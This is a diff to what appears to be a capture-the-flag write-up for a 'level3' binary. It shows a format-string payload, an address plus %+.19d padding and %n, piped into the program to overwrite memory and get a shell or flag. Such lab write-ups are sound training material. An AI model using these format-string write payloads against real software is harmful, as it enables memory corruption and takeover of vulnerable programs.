@@ -15,6 +15,6 @@ We can see that our adress is in the 4th argument, we just have to make sure our
 prints 64 characters exactly.
 I used %+.19d for the three arguments before %n to ensure that each will print 20 characters, plus the 4 for the pointer we have 64.
 
-python -c "print '\x8c\x98\x04\x08%+.19d%+.19d%+.19d%n'" > /tmp/lvl3
-cat /tmp/lvl3 - | ./level3
+(python -c "print '\x8c\x98\x04\x08%+.19d%+.19d%+.19d%n'" && cat) | ./level3
+
 And we can get the flag
